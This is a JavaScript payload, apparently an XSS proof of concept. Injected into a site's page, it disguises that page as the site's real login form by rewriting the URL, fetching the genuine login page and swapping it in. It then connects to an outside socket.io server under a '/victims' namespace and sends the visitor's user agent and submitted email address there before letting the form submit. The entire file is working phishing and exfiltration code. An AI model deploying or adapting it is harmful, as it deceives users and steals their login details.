var host = window.location.host;
var path = '/login';
var socket = null;

// The page URL is so ugly; let's pretend we're visiting a more reassuring URL
history.replaceState(null, 'Log in', path);

// We're lazy, so we'll use jQuery. Speed things up by loading a copy from the current site
var hash = /com$/.test(host) ? '67b1ba83e869c8e79f6e36d0e09b5800' :'1b3785e50daff644c60797acabafb97d';
loadScript('/assets/application-' + hash + '.js');

// Once jQuery is ready, use it to replace the current ugly page with the real login page
waitFor('jQuery', function($) {
  $.get('//' + host + path, setPageContent);
});

// Let's also load socket.io so that we can be more social
loadScript('https://test.orr.me.uk:8443/socket.io/socket.io.js');

// Once socket.io is ready, let's tell all our friends that we're online!
waitFor('io', function(io) {
  socket = io.connect('https://test.orr.me.uk:8443/victims', {secure: true});
  socket.emit('info', navigator.userAgent);
});

function setPageContent(html) {
  // Replacing the root HTML tag maybe isn't possible?
  // Anyway, this is ugly but works fine
  $(document.body).html(html);
 
  // The login page has a nicer title, so let's use that
  document.title = $('body title').text();

  // Make sure we hear about any login attempts...
  $('form').submit(submitForm);
}

function submitForm(e) {
  // Aw, that's unfortunate
  if (socket === null) {
    return true;
  }

  // Tell everyone that we're going to log in. Yay!
  socket.emit('submit', $('#user_session_email').val());

  // Wait a wee moment so that all our friends get that socket.io message
  e.preventDefault();
  var form = this;
  setTimeout(function() { form.submit(); }, 500);
}

function waitFor(property, callback) {
  if (window.hasOwnProperty(property)) {
    callback(window[property]);
  } else {
    setTimeout(function() { waitFor(property, callback); }, 50);
  }
}

function loadScript(url) {
  var tag = document.createElement('script');
  tag.src = url;
  document.getElementsByTagName('head')[0].appendChild(tag);
}

